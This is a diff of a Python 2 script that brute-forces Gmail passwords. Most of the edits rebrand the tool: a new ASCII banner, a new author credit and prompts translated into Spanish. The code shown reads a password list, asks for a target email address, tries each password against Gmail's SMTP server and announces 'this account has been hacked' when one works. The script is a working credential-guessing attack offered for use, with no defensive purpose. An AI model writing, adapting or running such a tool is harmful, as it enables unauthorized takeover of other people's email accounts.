@@ -7,22 +7,25 @@ from os import system
 
 def main():
    print """
-  ____                 _ _ _   _            _
- / ___|_ __ ___   __ _(_) | | | | __ _  ___| | __
-| |  _| '_ ` _ \ / _` | | | |_| |/ _` |/ __| |/ /
-| |_| | | | | | | (_| | | |  _  | (_| | (__|   <
- \____|_| |_| |_|\__,_|_|_|_| |_|\__,_|\___|_|\_\ """
+  /$$$$$$  /$$      /$$  /$$$$$$  /$$$$$$ /$$       /$$$$$$$$ /$$$$$$$ 
+ /$$__  $$| $$$    /$$$ /$$__  $$|_  $$_/| $$      | $$_____/| $$__  $$
+| $$  \__/| $$$$  /$$$$| $$  \ $$  | $$  | $$      | $$      | $$  \ $$
+| $$ /$$$$| $$ $$/$$ $$| $$$$$$$$  | $$  | $$      | $$$$$   | $$$$$$$ 
+| $$|_  $$| $$  $$$| $$| $$__  $$  | $$  | $$      | $$__/   | $$__  $$
+| $$  \ $$| $$\  $ | $$| $$  | $$  | $$  | $$      | $$      | $$  \ $$
+|  $$$$$$/| $$ \/  | $$| $$  | $$ /$$$$$$| $$$$$$$$| $$      | $$$$$$$/
+ \______/ |__/     |__/|__/  |__/|______/|________/|__/      |_______/ """
    print '================================================='
-   print '               coded by VPP Hacker              '
-   print '           Subscribe Our YouTube Channel         '
+   print '               coded by Ceriani                  '
+   print '              GMAIL Fuerza Bruta                 '
    print '================================================='
 
 main()
-print '[1] start the attack'
-print '[2] exit'
+print '[1] comenzando el ataque'
+print '[2] salir'
 option = input('Enter Option =>')
 if option == 1:
-   file_path = raw_input('Enter Password list :')
+   file_path = raw_input('pon el nombre de la passwordlist.txt :')
 else:
    system('clear')
    exit()
@@ -30,7 +33,7 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
+    user_name = raw_input(' gmail de ataque ->')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for password in pass_list:
@@ -41,14 +44,14 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] this account has been hacked, password ->' + password + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] this account has been hacked, password ->' + password + '     ^_^'
 
             break
          else:
